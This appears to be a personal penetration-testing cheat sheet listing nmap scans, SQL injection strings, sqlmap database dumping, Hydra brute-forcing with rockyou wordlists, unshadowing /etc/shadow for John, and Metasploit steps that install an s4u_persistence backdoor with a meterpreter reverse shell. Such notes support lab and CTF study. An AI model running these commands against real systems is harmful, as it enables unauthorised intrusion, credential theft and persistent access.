
### Telent :

> - telent hostName portNumber

&nbsp;
### SSH

>- ssh usernmae@hostname -p portNumber -i ssh_key_file
    
>- ssh username@hostName -p portNumber 
    
>-  ssh userName@hostName -t /bin/sh -p portNumber  --> log with out .bashrc file  
    
    
&nbsp;       
    
### OpenSSL:

> - openssl s_client -connect hostName:portNumber
    
&nbsp;

### Linux:
 
> - ls -ld .?*    ----> Show hidden files 


&nbsp;
### Nmap :

>-  nmap -sT IP_address             ----> TCP scan (active scanning), complete handshake
    
>-  namp -sS Ip_address            -----> Stealth scan(No logs), as the handshakes is NOT completed 
    
>-  nmap -sV IP_address           ------> probing services on the ports
    
>-  nmap -Pn IP_address           ------> scanning without sending pings 
    
>-  nmap -O IP_address           ------> scan with OS fingerprinting 
    
>-  nmap -A IP_address         --------> 
   
   
&nbsp;

### Netcat

>-  nc -l 1234

&nbsp;
### Manual SQL

>- ' and 1=1; -- -  | True returns something

>- ' and 1=2;-- -   | False does not return anything
 
>- ' or 1=1; -- - 

>- ' or 1=2; -- - 


### SQLmap 


>- sqlmap -u "URL" -- > qquick enumeration fro the URL


>- sqlmap -u "URL" -b --> get the banner 


>- sqlmap -u "URL" --tables --> to get the tables 

>-  sqlmap -u "URL" --dumps --> dumps all the database

&nbsp;

### Hydra:

> -  hydra targetWebsite http-post-form "/login.php:user=^USER^&pwd=^PASS^:invalid credentials" -L /usr/share/ncrack/minimal.usr -P /usr/share/seclists/Passwords/rockyou-15.txt  -f -v

&nbsp;
>  - hydra 192.168.2.4 ssh -L /usr/share/ncrack/minimal.usr -P /usr/share/seclists/Passwords/rockyou-10.txt -f -v 

	
&nbsp;

	
### John

__Unshadow__

> - unshadow /etc/passwd /etc/shadow > hashes.txt 

> - john --wordlist=/usr/share/john/password.lst hashes

> - John --show hashes 


&nbsp;


### Metaploit:

### Searchsploit :

> - searchsploit nameofVuln OS_type
        
> - searchsolit rpc windows
            
> - searchsploit MS08-067 windows



### Metasploit :


> - search vlunerabilityName
        
> - search OSType
        
> - use pathof the exploit

> - show payloads

> - set payloads typeofPayload
        
> - set RHOST
        
> - set RPORT 
        
> - exploit

&nbsp;

### USing Metasploit with exploits:


__[s4u_persistence]                             |  install backdoor on meterpreter session using__ 

> - use exploit/windows/local/s4u_persistence     |  module 

> - show options                                  |  show options that come with the module 

> - set trigger logon                             |  sets up the module to start when the usre logson 


>  - set payload/windows/meterpreter/reverse_tcp  | generated the payload type reverse shell 


> - set LHOST hostIP			          | add host IP


> - set LPORT hostPORT 				  | add host port 

> - exploit 



__Set up a listener handler__


> - use exploit/multi/handler    		 | setting up listener handler


> - set payload/meterpreter/revserse_tcp   | setting up meterpreter


> - set LHOST				 | host IP


> - set LPORT 				 | host Port 
	

> - show options 				 | show the options that comes with a module 


> - exploit 


__Meterpreter Commands:___


> - screenshot                           | for desktop screenshot

> - download filePath 			 | download files from the other machine 

>- upload filePath 			 | upload files to the other machine 

> - help 				 | to show all the meterpreter commands 
